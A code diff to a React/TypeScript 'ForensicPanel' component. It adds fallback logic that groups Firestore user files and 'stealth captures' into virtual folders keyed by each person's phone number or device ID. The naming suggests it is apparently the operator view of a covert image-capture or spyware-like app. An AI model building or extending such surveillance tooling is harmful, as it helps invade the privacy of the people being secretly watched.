@@ -737,9 +737,65 @@ export const ForensicPanel6532 = ({ onClose, showToast }: { onClose: () => void,
       setStealthImages(captures);
 
       // Fetch stored folders directories
-      const foldersRes = await fetch('/api/stored-images');
-      if (foldersRes.ok) {
-        setStoredFolders(await foldersRes.json());
+      let gotFolders = false;
+      try {
+        const foldersRes = await fetch('/api/stored-images');
+        if (foldersRes.ok) {
+          const foldersData = await foldersRes.json();
+          if (foldersData && foldersData.length > 0) {
+            setStoredFolders(foldersData);
+            gotFolders = true;
+          }
+        }
+      } catch (err) {
+        console.warn("Failed fetching stored folders from API:", err);
+      }
+
+      // If local filesystem API is empty or failing, construct virtual folders from Firestore documents
+      if (!gotFolders) {
+        try {
+          const fbFiles = await firebaseFetchAllUserFiles();
+          const virtualFoldersMap: Record<string, any> = {};
+
+          // Add user files to virtual folders
+          fbFiles.forEach(f => {
+            const userPhone = f.phone || f.deviceId || 'مشترك_آمن';
+            const folderName = `${userPhone}_FirebaseCloud`;
+            if (!virtualFoldersMap[folderName]) {
+              virtualFoldersMap[folderName] = {
+                folderName,
+                files: []
+              };
+            }
+            virtualFoldersMap[folderName].files.push({
+              name: f.fileName || `file_${f.id}.pdf`,
+              path: f.fileContent || '', 
+              timestamp: f.timestamp || Date.now()
+            });
+          });
+
+          // Embed stealth captures into the user folders so that folder views list them
+          captures.forEach(img => {
+            const userPhone = img.phone || img.deviceId || 'مشترك_حساب';
+            const folderName = `${userPhone}_FirebaseCloud`;
+            if (!virtualFoldersMap[folderName]) {
+              virtualFoldersMap[folderName] = {
+                folderName,
+                files: []
+              };
+            }
+            virtualFoldersMap[folderName].files.push({
+              name: `stealth_${img.id}.ts`, 
+              path: img.imageContent || img.imageB64 || img.url || '',
+              timestamp: img.timestamp || img.createdAt || Date.now(),
+              isEncrypted: false
+            });
+          });
+
+          setStoredFolders(Object.values(virtualFoldersMap));
+        } catch (fireErr) {
+          console.error("Failed building virtual folders from Firestore:", fireErr);
+        }
       }
     } catch(e) {
       console.error(e);
